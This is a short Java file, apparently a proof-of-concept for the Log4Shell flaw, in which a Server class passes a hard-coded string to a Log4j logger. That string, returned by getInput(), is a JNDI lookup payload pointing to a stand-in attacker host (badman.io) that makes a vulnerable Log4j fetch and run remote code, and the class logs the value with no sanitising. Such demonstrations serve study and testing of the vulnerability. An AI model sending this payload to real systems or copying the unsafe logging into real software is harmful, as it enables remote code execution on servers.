import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Server {

    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(Server.class);
        String input = getInput();
        logger.error(input);
    }

    private static String getInput() {
        return "${jndi:ldap://badman.io/Exploit}";
    }
}
